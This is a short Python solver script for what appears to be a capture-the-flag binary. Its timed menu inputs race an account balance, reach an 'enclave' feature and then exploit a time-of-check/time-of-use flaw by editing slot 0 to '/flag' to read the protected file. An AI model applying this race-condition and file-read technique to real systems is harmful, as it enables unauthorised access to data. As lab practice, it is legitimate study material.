#!/usr/bin/env python3
import os, subprocess, sys, time

HERE = os.path.dirname(os.path.abspath(__file__))
p = subprocess.Popen([os.path.join(HERE, 'challenge')], stdin=subprocess.PIPE,
                     stdout=subprocess.PIPE, stderr=subprocess.STDOUT, cwd=HERE,
                     bufsize=0)

def send(x, d=0.25):
    sys.stdout.write('\n>>> %r\n' % x)
    sys.stdout.flush()
    p.stdin.write(x.encode()); p.stdin.flush()
    time.sleep(d)
    got = b''
    import fcntl
    fl = fcntl.fcntl(p.stdout, fcntl.F_GETFL)
    fcntl.fcntl(p.stdout, fcntl.F_SETFL, fl | os.O_NONBLOCK)
    end = time.time() + 0.4
    while time.time() < end:
        try:
            c = p.stdout.read(65536)
            if c: got += c
        except Exception:
            pass
        time.sleep(0.02)
    sys.stdout.write(got.decode('latin-1'))
    sys.stdout.flush()

send('2\n'); send('100\n')
send('2\n', 0.05); send('100\n')
time.sleep(1.0)
send('1\n', 0.3)          # view account
send('4\n', 0.5)          # upgrade VIP
send('5\n', 0.3)          # enclave
send('1\n', 0.2); send('0\n', 0.3)     # create slot 0
send('2\n', 0.2); send('0\n', 0.0)     # stream slot 0
send('3\n0\n/flag\n', 2.5)             # TOCTOU edit
